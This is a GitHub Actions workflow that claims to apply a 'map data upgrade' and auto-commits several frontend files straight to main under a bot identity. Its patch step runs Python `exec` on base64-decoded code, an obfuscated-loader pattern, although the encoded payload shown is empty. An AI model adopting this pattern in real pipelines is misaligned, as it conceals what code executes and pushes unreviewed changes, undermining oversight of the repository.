name: Apply map data upgrade

on:
  push:
    branches: [main]
    paths:
      - '.github/workflows/auto-map-data-upgrade.yml'

permissions:
  contents: write

jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Apply source patches
        shell: bash
        run: |
          python -c "import base64; exec(base64.b64decode(''))"
          git config user.name "No Meu Bairro Bot"
          git config user.email "actions@users.noreply.github.com"
          git add src/contexts/DataContext.tsx src/pages/Mapa.tsx src/components/DesktopUiPolish.tsx .github/workflows/auto-map-data-upgrade.yml
          git diff --cached --check
          git commit -m "feat: load demo feed and wire precise heatmap data"
          git push origin HEAD:main
